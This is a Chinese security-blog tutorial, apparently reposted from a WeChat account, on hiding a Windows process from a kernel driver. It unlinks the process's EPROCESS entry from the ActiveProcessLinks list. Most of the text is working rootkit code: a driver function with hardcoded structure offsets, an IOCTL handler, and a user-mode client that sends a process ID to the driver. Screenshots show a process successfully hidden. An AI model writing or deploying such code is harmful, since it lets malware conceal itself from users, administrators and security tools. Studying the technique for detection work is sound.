> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/q_RLxbs_BU1SKglFvNnvQg)

前言

    在 Windows 的内核中，存在一个双向链表 AcvtivePeorecssList 保存着进程的 EPROCESS 结构，通过断链的操作来实现进程隐藏。

1. 功能分析实现

    通过 Windbg 查看到了 AcvtivePeorecssList 和进程 ID 的位置。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyzC260wuNUZwHmtD6ReXlBe0Re6LfnFRBHoYeHlX7icz0JveibbIpXrqFfEpgqIdqxHjP52UL0Zia6Vg/640?wx_fmt=png)

    那么代码如何实现呢？继续看我这个灵魂画手画的图，既然是一个双向链表。**我们的第二个节点的下一个要指向第四个，第四个的上一个要指向第二个。**  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyzC260wuNUZwHmtD6ReXlBeWtcJnwUIxGKNwKV5huqzc6J8ZjoMC4DXUfJhhloBKsvwU1Fw8Nx42g/640?wx_fmt=png)

2. 代码实现

    这里通过一个循环来遍历，当 ID 等于我们传入的进程 ID，我们就进行断链操作。记住这里的 pEprocess + 0xb4 是获取的进程 ID 的地址，要用 * 取地址的值才可以。

```
//断链操作
pblink->Blink->Flink = pblink->Flink;
pblink->Flink->Blink = pblink->Blink;
```

```
NTSTATUS HidenProcess(ULONG PID){
  ULONG ID = 0;
  DWORD_PTR pEprocess = (DWORD_PTR)PsGetCurrentProcess();
  PLIST_ENTRY palink = (PLIST_ENTRY)(pEprocess + 0xb8);
  PLIST_ENTRY pblink = palink->Flink;
  while (pblink->Flink != palink->Flink){
    pEprocess = ((DWORD_PTR)pblink - 0xb8);
    ID = *((ULONG*)(pEprocess + 0xb4));
    if (ID == PID){
      pblink->Blink->Flink = pblink->Flink;
      pblink->Flink->Blink = pblink->Blink;
      DbgPrint("进程成功隐藏\n");
    }
    pblink = pblink->Flink;
  }
  return STATUS_SUCCESS;
}
```

3. 代码改进

    如果单单用上方这种的话，每次用的话，就需要在驱动文件内传入我们要隐藏的进程 ID，为了方便，这里改用了 I/O 通信，通过三环的 exe 输入进程 ID，之后将进程 ID 发送到驱动文件并实施隐藏效果。  

    三环代码

```
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <winioctl.h>
#define IO_READ_Control CTL_CODE(FILE_DEVICE_UNKNOWN, 0x999, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
int main(int argc, char* argv[])
{
  HANDLE h = CreateFile(L"\\\\.\\meta", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  ULONG inlen = 0;
  printf("请输入要隐藏的进程ID:\n");
  scanf("%d",&inlen);
  ULONG pro = 0;
  if (DeviceIoControl(h, IO_READ_Control, &inlen, sizeof(inlen), &inlen, sizeof(inlen), &pro, NULL)){
    printf("进程隐藏成功");
  }
  CloseHandle(h);
  system("pause");
  return 0;
}
```

驱动代码  

        将下方的回调函数改为 MyControl，并将 MyControl 接收到的三环 exe 发送的进程 ID 传入到 HidenProcess 函数中，实现进程断链隐藏。

```
PDRIVER_OBJECT-->MajorFunction[IRP_MJ_DEVICE_CONTROL]=MyControl
```

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyzC260wuNUZwHmtD6ReXlBer6mkcEWU5LTpOIud0ic51prib8GrRSIrENmvk3ANmm9zGOVrufqfYxyw/640?wx_fmt=png)

```
NTSTATUS HidenProcess(ULONG PID){
  ULONG ID = 0;
  DWORD_PTR pEprocess = (DWORD_PTR)PsGetCurrentProcess();
  PLIST_ENTRY palink = (PLIST_ENTRY)(pEprocess + 0xb8);
  PLIST_ENTRY pblink = palink->Flink;
  while (pblink->Flink != palink->Flink){
    pEprocess = ((DWORD_PTR)pblink - 0xb8);
    ID = *((ULONG*)(pEprocess + 0xb4));
    if (ID == PID){
      pblink->Blink->Flink = pblink->Flink;
      pblink->Flink->Blink = pblink->Blink;
      DbgPrint("进程成功隐藏\n");
    }
    pblink = pblink->Flink;
  }
  return STATUS_SUCCESS;
}

NTSTATUS MyControl(PDEVICE_OBJECT DeviceObject, PIRP pir){
  //获取设备栈
  PIO_STACK_LOCATION pio = IoGetCurrentIrpStackLocation(pir);
  PVOID buffer = pir->AssociatedIrp.SystemBuffer;//数据
  ULONG code = pio->Parameters.DeviceIoControl.IoControlCode;
  pir->IoStatus.Status = STATUS_SUCCESS;//返回成功
  pir->IoStatus.Information = 4;//只接受四个
  ULONG PID = 0;
  switch (code){
    case IO_READ_Control:
    {
      
      DbgPrint("要隐藏的进程ID为 :%d\r\n",*(PULONG_PTR)buffer);
      PID = *(PULONG_PTR)buffer;
      HidenProcess(PID);
      break;
    }
    default:
      break;
  }
  IoCompleteRequest(pir, IO_NO_INCREMENT);//封包发送
  return STATUS_SUCCESS;
}
```

    **全部驱动代码在公众号留言回复：****进程隐藏** **即可获取**

 3. 运行实例

    这里我打开了一个 VC6 编译器，进程 ID 为 3124。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyzC260wuNUZwHmtD6ReXlBeicXPprNlrw5ico8nHN3ZdGVWhUasj6FkJJ1OfVw5PicNaJL2pOXu5m6Hg/640?wx_fmt=png)

    接下来输入 VC6 的进程 ID，并看一下效果，成功隐藏掉了 VC6 的进程。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyzC260wuNUZwHmtD6ReXlBeLWbouKz2R3Xib1JfdOiauVoicSwJ45ygEvfsIFQAhMbZ5HAWK2ibvZYcEg/640?wx_fmt=png)

 **微信搜索关注 "安全族" 长期更新安全资料，扫一扫即可关注安全族！**

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywCsRiaweFhRW8aDdjtoCoSU2eQAJ6KxKAoP0PSHvjGJvTZcRRXTAeSd9Qyib0ynLnBUwdiahhhOaSDQ/640?wx_fmt=jpeg)